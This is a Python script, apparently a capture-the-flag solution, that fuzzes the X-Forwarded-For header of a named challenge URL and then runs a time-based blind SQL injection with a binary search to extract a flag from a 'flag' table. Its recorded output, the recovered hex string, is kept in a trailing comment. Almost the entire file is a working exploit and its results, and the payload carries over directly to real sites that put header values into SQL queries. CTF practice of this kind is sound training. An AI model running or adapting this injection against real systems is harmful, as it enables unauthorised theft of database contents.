import requests
import urllib
import time
url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
def fuzz():
	for x in range(33,127):
		r = requests.get(url,headers={'X-Forwarded-For':chr(x)})
		if chr(x) not in r.content[12:]:
			print ("[INFO] filtered the char {0}".format(chr(x)))
# fuzz()
def success(x):
	# print x
	if x > 5:
		return True
	else:
		return False

"""
mysql> insert into flag(flag) values ('111' and sleep(2) and '');
Query OK, 1 row affected (2.01 sec)
"""
db_name = 'WEB4'
myascii = ''.join([chr(x) for x in range(33,128)])

def check(x,i):
	# x = chr(x)
	exp = """select * from flag"""
	data_base_payload = """1' and (select case when (ascii(substr(({0}) from {1} for 1))>={2}) then sleep(5) else 0 end) and '"""
	starttime=time.time()
	payload = data_base_payload.format(exp,i,x)
	r = requests.get(url,headers={'X-Forwarded-For':payload})
	s = time.time() - starttime
	return success(s)
def exploit():
	db_name = ''
	table_name = 'flag'
	for i in range(1,40):
		print("[INFO] start to exploit %d"%i)
		left = 0
		right = 128
		while left<right:
			# print (left,right)
			mid = (left+right+1)>>1;
			if(check(mid,i)):
				left = mid
			else:
				right = mid-1
		db_name += chr(left)
		print db_name
			# success(s)
		# print db_name	
exploit()
# print r.content
"""
[INFO] start to exploit 0
 
[INFO] start to exploit 1
 C
[INFO] start to exploit 2
 CD
[INFO] start to exploit 3
 CDB
[INFO] start to exploit 4
 CDBF
[INFO] start to exploit 5
 CDBF1
[INFO] start to exploit 6
 CDBF14
[INFO] start to exploit 7
 CDBF14C
[INFO] start to exploit 8
 CDBF14C9
[INFO] start to exploit 9
 CDBF14C95
[INFO] start to exploit 10
 CDBF14C955
[INFO] start to exploit 11
 CDBF14C9551
[INFO] start to exploit 12
 CDBF14C9551D
[INFO] start to exploit 13
 CDBF14C9551D5
[INFO] start to exploit 14
 CDBF14C9551D5B
[INFO] start to exploit 15
 CDBF14C9551D5BE
[INFO] start to exploit 16
 CDBF14C9551D5BE5
[INFO] start to exploit 17
 CDBF14C9551D5BE56
[INFO] start to exploit 18
 CDBF14C9551D5BE561
[INFO] start to exploit 19
 CDBF14C9551D5BE5612
[INFO] start to exploit 20
 CDBF14C9551D5BE5612F
[INFO] start to exploit 21
 CDBF14C9551D5BE5612F7
[INFO] start to exploit 22
 CDBF14C9551D5BE5612F7B
[INFO] start to exploit 23
 CDBF14C9551D5BE5612F7BB
[INFO] start to exploit 24
 CDBF14C9551D5BE5612F7BB5
[INFO] start to exploit 25
 CDBF14C9551D5BE5612F7BB5D
[INFO] start to exploit 26
 CDBF14C9551D5BE5612F7BB5D2
[INFO] start to exploit 27
 CDBF14C9551D5BE5612F7BB5D28
[INFO] start to exploit 28
 CDBF14C9551D5BE5612F7BB5D286
[INFO] start to exploit 29
 CDBF14C9551D5BE5612F7BB5D2867
[INFO] start to exploit 30
 CDBF14C9551D5BE5612F7BB5D28678
[INFO] start to exploit 31
 CDBF14C9551D5BE5612F7BB5D2867853
""" 
# 
